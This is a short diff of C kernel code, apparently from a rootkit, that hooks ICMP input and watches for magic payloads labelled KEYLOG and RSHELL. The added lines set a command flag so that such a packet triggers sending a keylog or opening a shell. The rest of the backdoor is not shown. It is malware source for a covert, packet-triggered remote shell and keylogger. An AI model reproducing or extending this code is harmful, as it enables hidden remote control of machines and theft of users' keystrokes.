@@ -461,11 +461,13 @@ int icmp_input_hook(struct mbuf **m, int *off, int proto){
 	/* Is this the ICMP message we are looking for? */
 	if (strncmp(icp->icmp_data, KEYLOG, 3) == 0) {
 		printf("send keylog.\n");
+		strcpy(cmd, "key");
 		return(0);
 	}
 
 	else if (strncmp(icp->icmp_data, RSHELL, 5) == 0) {
 			printf("send shell.\n");
+			strcpy(cmd, "shell");
 			return(0);
 	}
 	else
